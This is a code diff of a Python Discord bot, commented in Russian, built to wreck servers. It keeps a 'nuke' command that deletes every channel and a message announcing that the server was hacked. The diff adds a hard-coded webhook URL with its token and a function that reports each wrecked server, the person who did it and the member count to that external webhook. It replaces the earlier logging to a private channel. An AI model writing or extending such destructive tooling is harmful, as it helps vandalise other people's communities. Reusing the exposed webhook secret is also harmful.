@@ -1,8 +1,11 @@
 import discord
 from discord.ext import commands
 import asyncio
+import aiohttp
 from threading import Thread
 from flask import Flask
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1520839426207383595/Khj5QPyzUjOetcDUS7Rzm9VOwj5FQvtoMD8QGdHtAnXsBlm1WLv-w1FcS_avKGOzl3q3"
 
 app = Flask('')
 
@@ -27,6 +30,19 @@ async def on_ready():
 async def ping(ctx):
     await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
 
+async def send_crash_log(guild_name, author, member_count):
+    async with aiohttp.ClientSession() as session:
+        embed = {
+            "title": "Сервер крашнут!",
+            "color": 0xff0000,
+            "fields": [
+                {"name": "Сервер", "value": guild_name, "inline": False},
+                {"name": "Крашнул", "value": author, "inline": False},
+                {"name": "Участников", "value": str(member_count), "inline": False}
+            ]
+        }
+        await session.post(WEBHOOK_URL, json={"embeds": [embed]})
+
 @bot.command()
 async def nuke(ctx):
     guild = ctx.guild
@@ -35,15 +51,7 @@ async def nuke(ctx):
         await ctx.send("пошёл нахуй")
         return
     
-    crash_log = bot.get_guild(1520817743127904477)
-    if crash_log:
-        channel = discord.utils.get(crash_log.text_channels, name="крашнутые-серваки")
-        if channel:
-            embed = discord.Embed(title="Сервер крашнут!", color=0xff0000)
-            embed.add_field(name="Сервер", value=guild.name, inline=False)
-            embed.add_field(name="Крашнул", value=ctx.author.mention, inline=False)
-            embed.add_field(name="Участников", value=guild.member_count, inline=False)
-            await channel.send(embed=embed)
+    await send_crash_log(guild.name, ctx.author.mention, guild.member_count)
     
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
